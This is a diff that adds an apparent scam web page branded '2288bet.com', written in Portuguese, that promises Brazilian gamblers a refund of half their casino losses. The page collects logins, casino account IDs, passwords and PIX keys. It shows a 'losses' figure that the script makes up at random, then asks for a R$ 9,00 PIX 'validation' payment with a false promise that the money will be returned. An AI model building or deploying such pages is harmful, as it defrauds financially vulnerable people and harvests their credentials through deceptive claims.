@@ -1,0 +1,351 @@
+<meta charset="UTF-8">
+<title>2288bet.com</title>
+<style>
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+    font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+  }
+
+  body {
+    background: url('vffvevfev.webp');
+    background-size: cover;
+    background-position: center;
+    background-repeat: no-repeat;
+    background-attachment: fixed;
+    color: #fff;
+    min-height: 100vh;
+    position: relative;
+  }
+
+  body::before {
+    content: '';
+    position: absolute;
+    top: 0;
+    left: 0;
+    right: 0;
+    bottom: 0;
+    background: linear-gradient(135deg, rgba(26, 26, 46, 0.95), rgba(22, 33, 62, 0.95));
+    z-index: 0;
+  }
+
+  .container {
+    position: relative;
+    z-index: 1;
+    max-width: 800px;
+    margin: 0 auto;
+    padding: 20px;
+  }
+
+  .logo {
+    text-align: center;
+    margin-bottom: 40px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    gap: 15px;
+  }
+
+  .bank-logo {
+    width: 60px;
+    height: 60px;
+    object-fit: contain;
+    background: transparent;
+  }
+
+  .card {
+    background: rgba(255, 255, 255, 0.1);
+    backdrop-filter: blur(10px);
+    border-radius: 15px;
+    padding: 30px;
+    margin-bottom: 20px;
+    border: 1px solid rgba(255, 255, 255, 0.1);
+    box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+  }
+
+  h1 {
+    font-size: 2.5em;
+    text-align: center;
+    color: #007bff;
+    margin-bottom: 20px;
+    text-shadow: 2px 2px 4px rgba(0, 0, 0, 0.5);
+  }
+
+  .form-group {
+    margin-bottom: 20px;
+  }
+
+  label {
+    display: block;
+    margin-bottom: 8px;
+    color: #ffd700;
+  }
+
+  input, select {
+    width: 100%;
+    padding: 12px;
+    border: none;
+    border-radius: 5px;
+    background: rgba(255, 255, 255, 0.1);
+    color: #fff;
+    margin-bottom: 10px;
+    border: 1px solid rgba(255, 215, 0, 0.3);
+  }
+
+  button {
+    width: 100%;
+    padding: 12px;
+    background: #ffd700;
+    border: none;
+    border-radius: 5px;
+    color: #1a1a2e;
+    font-weight: bold;
+    cursor: pointer;
+    transition: all 0.3s ease;
+    box-shadow: 0 4px 15px rgba(255, 215, 0, 0.3);
+  }
+
+  button:hover {
+    background: #ffed4a;
+    transform: translateY(-2px);
+    box-shadow: 0 6px 20px rgba(255, 215, 0, 0.4);
+  }
+
+  .success-message {
+    color: #4CAF50;
+    text-align: center;
+    margin-top: 10px;
+  }
+
+  .error-message {
+    color: #ff4444;
+    text-align: center;
+    margin-top: 10px;
+  }
+
+  .progress-steps {
+    display: flex;
+    justify-content: space-between;
+    margin-bottom: 30px;
+  }
+
+  .step {
+    flex: 1;
+    text-align: center;
+    position: relative;
+    padding: 10px;
+  }
+
+  .step.active {
+    color: #ffd700;
+  }
+
+  .step:not(:last-child)::after {
+    content: '';
+    position: absolute;
+    top: 50%;
+    right: -50%;
+    width: 100%;
+    height: 2px;
+    background: rgba(255, 215, 0, 0.3);
+  }
+
+  .step.completed:not(:last-child)::after {
+    background: #ffd700;
+  }
+
+  .step-number {
+    width: 30px;
+    height: 30px;
+    border-radius: 50%;
+    background: rgba(255, 215, 0, 0.3);
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    margin: 0 auto 10px;
+  }
+
+  .step.active .step-number,
+  .step.completed .step-number {
+    background: #ffd700;
+    color: #1a1a2e;
+  }
+</style>
+</head>
+<body>
+
+<div class="container">
+  <div class="logo">
+    <img src="rfefrerferf.png" alt="2288bet Logo" class="bank-logo">
+    <h1>2288bet.com</h1>
+    <img src="rfefrerferf.png" alt="2288bet Logo" class="bank-logo">  
+  </div>
+
+  <div class="progress-steps">
+    <div class="step completed" id="step1">
+      <div class="step-number">1</div>
+      <div>Cadastro</div>
+    </div>
+    <div class="step" id="step2">
+      <div class="step-number">2</div>
+      <div>Verificação</div>
+    </div>
+    <div class="step" id="step3">
+      <div class="step-number">3</div>
+      <div>Recuperação</div>
+    </div>
+  </div>
+
+  <div class="card" id="registerForm">
+    <h2>Cadastro</h2>
+    <div class="form-group">
+      <label>Nome de Login</label>
+      <input type="text" id="username" placeholder="Digite seu nome de usuário">
+    </div>
+    <div class="form-group">
+      <label>ID da Conta do Casino</label>
+      <input type="text" id="casinoId" placeholder="Digite seu ID do casino">
+    </div>
+    <div class="form-group">
+      <label>Senha</label>
+      <input type="password" id="password" placeholder="Digite sua senha">
+    </div>
+    <div class="form-group">
+      <label>Confirmar Senha</label>
+      <input type="password" id="confirmPassword" placeholder="Confirme sua senha">
+    </div>
+    <div class="form-group">
+      <label>Tipo de Chave PIX</label>
+      <select id="pixKeyType">
+        <option value>Selecione o tipo de chave</option>
+        <option value="cpf">CPF</option>
+        <option value="email">E-mail</option>
+        <option value="phone">Telefone</option>
+        <option value="random">Chave Aleatória</option>
+      </select>
+    </div>
+    <div class="form-group">
+      <label>Chave PIX</label>
+      <input type="text" id="pixKey" placeholder="Digite sua chave PIX">
+    </div>
+    <button onclick="register()">Cadastrar</button>
+  </div>
+
+  <div class="card" id="verificationForm" style="display: none;">
+    <h2>Verificação de Conta</h2>
+    <div class="form-group">
+      <label>Código de Verificação</label>
+      <input type="text" id="verificationCode" placeholder="Digite o código de 6 dígitos">
+      <p style="color: #ffd700; font-size: 0.9em; margin-top: 5px;">
+        Um código de verificação foi enviado para seu email cadastrado
+      </p>
+    </div>
+    <button onclick="verify()">Verificar</button>
+  </div>
+
+  <div class="card" id="loginForm" style="display: none;">
+    <h2>Login</h2>
+    <div class="form-group">
+      <label>Nome de Login</label>
+      <input type="text" id="loginUsername" placeholder="Digite seu nome de usuário">
+    </div>
+    <div class="form-group">
+      <label>Senha</label>
+      <input type="password" id="loginPassword" placeholder="Digite sua senha">
+    </div>
+    <button onclick="login()">Entrar</button>
+  </div>
+
+  <div class="card" id="paymentVerification" style="display: none;">
+    <h2>Validação da Conta</h2>
+    <div class="form-group">
+      <p style="margin-bottom: 15px;">Para validar que a conta realmente pertence a você, será necessário realizar um Pix no valor simbólico de R$ 9,00. Este passo é essencial para garantir sua segurança e autenticidade no processo.</p>
+      <p style="color: #ffd700; margin-bottom: 20px;">Importante: O valor será devolvido à sua conta após a validação.</p>
+      <label>Chave PIX para Pagamento</label>
+      <input type="text" value="00000000000" readonly>
+    </div>
+    <button onclick="confirmPayment()">Confirmar Pagamento</button>
+  </div>
+
+  <div class="card" id="recoverySection" style="display: none;">
+    <h2>Recuperação de Perdas</h2>
+    <div class="form-group">
+      <label>Total de Perdas Detectadas</label>
+      <input type="text" id="totalLosses" readonly>
+    </div>
+    <div class="form-group">
+      <label>Valor Recuperável (50%)</label>
+      <input type="text" id="recoveryAmount" readonly>
+    </div>
+    <div class="form-group">
+      <label>Sua Chave PIX Cadastrada</label>
+      <input type="text" id="registeredPixKey" readonly>
+    </div>
+    <button onclick="requestRecovery()">Solicitar Recuperação</button>
+  </div>
+</div>
+
+<script>
+const users = [];
+function register() {
+  const username = document.getElementById('username').value;
+  const casinoId = document.getElementById('casinoId').value;
+  const password = document.getElementById('password').value;
+  const confirmPassword = document.getElementById('confirmPassword').value;
+  const pixKeyType = document.getElementById('pixKeyType').value;
+  const pixKey = document.getElementById('pixKey').value;
+  if (!username || !casinoId || !password || !confirmPassword || !pixKeyType || !pixKey) {
+    alert('Por favor, preencha todos os campos!');
+    return;
+  }
+  if (password !== confirmPassword) {
+    alert('As senhas não coincidem!');
+    return;
+  }
+  const user = {
+    username,
+    casinoId,
+    password,
+    pixKeyType,
+    pixKey,
+    losses: Math.floor(Math.random() * 50000) + 10000
+  };
+  users.push(user);
+  document.getElementById('registerForm').style.display = 'none';
+  document.getElementById('loginForm').style.display = 'block';
+  document.getElementById('step2').classList.add('completed');
+  document.getElementById('step3').classList.add('active');
+}
+function login() {
+  const username = document.getElementById('loginUsername').value;
+  const password = document.getElementById('loginPassword').value;
+  const user = users.find(u => u.username === username && u.password === password);
+  if (user) {
+    document.getElementById('loginForm').style.display = 'none';
+    document.getElementById('recoverySection').style.display = 'block';
+    document.getElementById('step3').classList.add('completed');
+    document.getElementById('totalLosses').value = `R$ ${user.losses.toFixed(2)}`;
+    document.getElementById('recoveryAmount').value = `R$ ${(user.losses * 0.5).toFixed(2)}`;
+    document.getElementById('registeredPixKey').value = `${user.pixKeyType}: ${user.pixKey}`;
+  } else {
+    alert('Usuário ou senha incorretos!');
+  }
+}
+function requestRecovery() {
+  const username = document.getElementById('loginUsername').value;
+  const user = users.find(u => u.username === username);
+  if (user) {
+    document.getElementById('recoverySection').style.display = 'none';
+    document.getElementById('paymentVerification').style.display = 'block';
+  }
+}
+function confirmPayment() {
+  const username = document.getElementById('loginUsername').value;
+  const user = users.find(u => u.username === username);
+  if (user) {
+    alert(`Pagamento confirmado! Você receberá R$ ${(user.losses * 0.5).toFixed(2)} em até 48 horas úteis na chave PIX: ${user.pixKey}`);
+  }
+}
+</script>
+</body></html>
